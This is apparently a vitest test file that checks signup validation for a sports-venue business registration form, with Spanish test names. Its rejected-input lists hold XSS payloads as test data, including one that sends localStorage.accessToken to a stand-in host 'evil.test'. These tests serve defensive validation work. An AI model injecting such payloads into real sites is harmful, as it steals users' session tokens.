import { plainToInstance } from 'class-transformer';
import { validate } from 'class-validator';
import { describe, expect, it } from 'vitest';
import { RegisterBusinessAdminDto, SignupBusinessDto } from './auth.dto.js';

const base = {
  fullName: 'Andrés Gómez',
  email: 'admin@golazo.co',
  password: 'secreta123',
  businessName: 'Cancha El Golazo',
  address: 'Calle 10 # 5-20',
  neighborhood: 'Centro',
  cityId: '0082c56c-f0f6-4550-aa87-a7e9ea9cdfcf',
};

const erroresDe = async (cls: new () => object, data: object) =>
  (await validate(plainToInstance(cls, data))).map((e) => e.property);

describe('SignupBusinessDto', () => {
  it('exige el celular', async () => {
    expect(await erroresDe(SignupBusinessDto, base)).toContain('phone');
    expect(await erroresDe(SignupBusinessDto, { ...base, phone: '' })).toContain('phone');
  });

  it('acepta el registro con celular', async () => {
    expect(await erroresDe(SignupBusinessDto, { ...base, phone: '+57 300 123 4567' })).toEqual([]);
  });

  it('no cambia el registro de administrador, donde el celular sigue siendo opcional', async () => {
    const { fullName, email, password } = base;
    expect(await erroresDe(RegisterBusinessAdminDto, { fullName, email, password })).toEqual([]);
  });
});

describe('nombre del negocio', () => {
  const conNombre = (businessName: string) => ({ ...base, phone: '+57 300 123 4567', businessName });

  it.each(['Cancha El Golazo', 'Arena Pádel 2', 'Cañaveral Sport', 'Las Palmas 10'])(
    'acepta letras, tildes, ñ, números y espacios: %s',
    async (name) => {
      expect(await erroresDe(SignupBusinessDto, conNombre(name))).toEqual([]);
    },
  );

  it('limpia los espacios sobrantes en vez de rechazarlos', async () => {
    const dto = plainToInstance(SignupBusinessDto, conNombre('  Cancha   El  Golazo '));
    expect(dto.businessName).toBe('Cancha El Golazo');
    expect((await validate(dto)).map((e) => e.property)).not.toContain('businessName');
  });

  it.each([
    '<img src=x onerror=fetch("https://evil.test/s?j="+localStorage.accessToken)>',
    '<script>alert(1)</script>',
    'Cancha "El Golazo"',
    'Golazo & Cia',
    'Cancha_1',
    '😀 Cancha',
  ])('rechaza símbolos, etiquetas y espacios raros: %s', async (name) => {
    expect(await erroresDe(SignupBusinessDto, conNombre(name))).toContain('businessName');
  });
});

describe('texto libre sin etiquetas', () => {
  const datos = (cambios: object) => ({ ...base, phone: '+57 300 123 4567', ...cambios });

  it('acepta direcciones y barrios con # y guiones', async () => {
    expect(
      await erroresDe(SignupBusinessDto, datos({ address: 'Cra. 5 # 10-20, Local 3', neighborhood: "San José (Norte)" })),
    ).toEqual([]);
  });

  it.each([
    ['address', '<img src=x onerror=alert(1)>'],
    ['neighborhood', 'Centro"><script>'],
    ['fullName', '<b>Andrés</b>'],
  ])('rechaza etiquetas en %s', async (campo, valor) => {
    expect(await erroresDe(SignupBusinessDto, datos({ [campo]: valor }))).toContain(campo);
  });
});

